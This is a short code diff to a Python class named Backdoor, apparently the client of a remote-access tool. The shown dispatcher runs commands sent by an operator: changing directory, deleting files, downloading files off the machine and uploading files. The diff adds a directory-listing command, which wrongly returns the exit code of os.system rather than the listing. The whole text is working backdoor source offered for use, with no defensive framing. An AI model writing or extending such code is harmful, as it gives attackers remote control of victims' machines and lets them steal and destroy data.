@@ -68,6 +68,8 @@ class Backdoor:
                     command_result = self.change_directory(command[1])
                 elif command[0] == "rm" and len(command) > 1:
                     command_result = self.remove(command[1])
+                elif command[0] == "ls":
+                    command_result = os.system('dir' if os.name == 'nt' else 'ls -la')
                 elif command[0] == "download":
                     command_result = self.read_file(command[1])
                 elif command[0] == "upload":
